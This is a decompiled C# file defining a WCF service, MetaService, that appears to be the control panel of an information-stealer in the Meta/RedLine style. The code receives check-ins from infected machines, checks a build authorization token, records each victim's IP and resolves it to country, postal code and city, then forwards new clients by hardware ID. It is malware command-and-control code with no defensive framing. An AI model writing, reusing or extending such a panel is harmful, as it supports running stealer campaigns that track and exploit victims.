using IPLocator;
using Meta.MainPanel.Data.Helpers;
using System;
using System.Net;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Meta.SharedModels;

[ServiceBehavior(Name = "WebHosting", AutomaticSessionShutdown = true, ConcurrencyMode = ConcurrencyMode.Multiple, InstanceContextMode = InstanceContextMode.PerSession, UseSynchronizationContext = true)]
public class MetaService : IRemoteEndpoint
{
    private object object_0;

    private readonly object object_1;

    private string CurrentIP
    {
        get
        {
            try
            {
                MessageProperties incomingMessageProperties = OperationContext.Current.IncomingMessageProperties;
                RemoteEndpointMessageProperty remoteEndpointMessageProperty = incomingMessageProperties[RemoteEndpointMessageProperty.Name] as RemoteEndpointMessageProperty;
                string text = null;
                if (OperationContext.Current.IncomingMessageHeaders.FindHeader("X-Forwarded-For", "ns1") != -1)
                {
                    text = OperationContext.Current.IncomingMessageHeaders.GetHeader<string>("X-Forwarded-For", "ns1");
                }
                if (string.IsNullOrWhiteSpace(text))
                {
                    if (incomingMessageProperties.Keys.Contains(HttpRequestMessageProperty.Name) && incomingMessageProperties[HttpRequestMessageProperty.Name] is HttpRequestMessageProperty httpRequestMessageProperty && httpRequestMessageProperty.Headers["X-Forwarded-For"] != null)
                    {
                        text = httpRequestMessageProperty.Headers["X-Forwarded-For"];
                    }
                    if (string.IsNullOrEmpty(text))
                    {
                        text = remoteEndpointMessageProperty.Address;
                    }
                }
                return string.IsNullOrWhiteSpace(text) ? "UNKNOWN" : text;
            }
            catch (Exception)
            {
                return "UNKNOWN";
            }
        }
    }

    private string CurrentToken
    {
        get
        {
            try
            {
                return OperationContext.Current.IncomingMessageHeaders.GetHeader<string>("Authorization", "ns1");
            }
            catch
            {
                return null;
            }
        }
    }

    public MetaService()
    {
        object_0 = CurrentIP;
        object_1 = CurrentToken;
    }

    public Task<bool> CheckConnect()
    {
        lock (MetaEvents.Counter)
        {
            MetaEvents.Counter = Convert.ToInt32(MetaEvents.Counter) + 1;
        }
        return Task.FromResult(result: true);
    }

    public static string xorIt(string key, string input)
    {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < input.Length; i++)
        {
            stringBuilder.Append((char)(input[i] ^ key[i % key.Length]));
        }
        return stringBuilder.ToString();
    }

    public Task<ClientSettings> OnGetSettings()
    {
        if (MetaEvents.OnGetSettings != null)
        {
            return MetaEvents.OnGetSettings();
        }
        return Task.FromResult<ClientSettings>(null);
    }

    public Task VerifyScanRequest(UserLog user)
    {
        try
        {
            lock (MetaEvents.Counter)
            {
                MetaEvents.Counter = Convert.ToInt32(MetaEvents.Counter) + 1;
            }
            if ((!(MetaEvents.OnVerify?.Invoke((string)object_1, user.BuildID))) ?? true)
            {
                return Task.Factory.StartNew(delegate
                {
                });
            }
            if (string.IsNullOrWhiteSpace(user.IP) || user.IP == "UNKNOWN")
            {
                user.IP = (string)object_0;
            }
            if (!MetaEvents.Domain && !((string)object_0).Contains(":") && (string)object_0 != user.IP)
            {
                user.IP = (string)object_0;
            }
            try
            {
                if (IPAddress.TryParse(user.IP, out var address) && address.IsIPv4MappedToIPv6)
                {
                    user.IP = address.MapToIPv4().ToString();
                }
            }
            catch
            {
            }
            if (string.IsNullOrWhiteSpace(user.Country))
            {
                user.Country = "UNKNOWN";
            }
            if (user.Country == "UNKNOWN")
            {
                try
                {
                    IPResult iPResult = (user.IP.Contains(":") ? IpLocator.IPv6Locator.IPQuery(user.IP) : IpLocator.IPv4Locator.IPQuery(user.IP));
                    user.Country = iPResult.CountryShort;
                    user.PostalCode = iPResult.ZipCode;
                    user.Location = iPResult.City + ", " + iPResult.Region;
                }
                catch (Exception)
                {
                }
            }
            if (user.Country == "?" || user.Country == "-")
            {
                user.Country = "UNKNOWN";
            }
            if (user.PostalCode == "?" || user.PostalCode == "-")
            {
                user.PostalCode = "UNKNOWN";
            }
            if (user.Location.Contains("?") || user.Location.Contains("-"))
            {
                user.Location = "UNKNOWN";
            }
            if (!string.IsNullOrWhiteSpace(user.HWID))
            {
                return MetaEvents.OnNewClientRecieved?.Invoke(user);
            }
        }
        catch (Exception ex2)
        {
            MessageBox.Show(ex2.ToString());
        }
        return Task.Factory.StartNew(delegate
        {
        });
    }
}
